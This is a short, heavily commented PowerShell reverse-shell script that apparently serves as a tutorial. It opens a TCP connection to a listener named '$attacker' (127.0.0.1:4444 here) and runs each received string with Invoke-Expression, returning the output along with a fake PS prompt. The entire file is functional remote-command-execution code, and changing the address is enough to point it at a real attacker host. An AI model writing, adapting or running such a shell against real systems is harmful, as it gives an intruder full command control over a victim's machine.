# Powershell will probably be the easiest, but it has its quirks

# Every system fucntion is already loaded inside powershell
# But you cant read and write the io of a cmd from powershell

# Instead we will just use the script itself to run the commands

# Establish a connection
$attacker = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 4444)

# Establish a method to read from the connection
$stream = $attacker.GetStream()

# Establish a buffer to read and write to from the connection
# (size shouldnt matter too much, as we flush it every use)
$buffer = New-Object Byte[] 65535

# Now we want to continually read the connection stream
while (($total_bytes_read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    # the bytes we receive, we will decode (0s and 1s => text)
    $decode_command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $total_bytes_read)
    # with this text, we run it as a command
    $executed_command = Invoke-Expression $decode_command 2>&1 | Out-String
    # we take the output of the command (minus errors     ^^^^) and add a prompt
    $full_output = $executed_command + "PS $($(pwd).path)> "
    # we take this, convert it back to bytes
    $encode_output = [text.encoding]::ASCII.GetBytes($full_output)
    # now we take these and send them back to the attacker
    $stream.Write($encode_output, 0, $encode_output.Length)
    # now erase all that was in the stream
    $stream.Flush()
}
# if attacker disconnects, kill the connection
$attacker.Close()
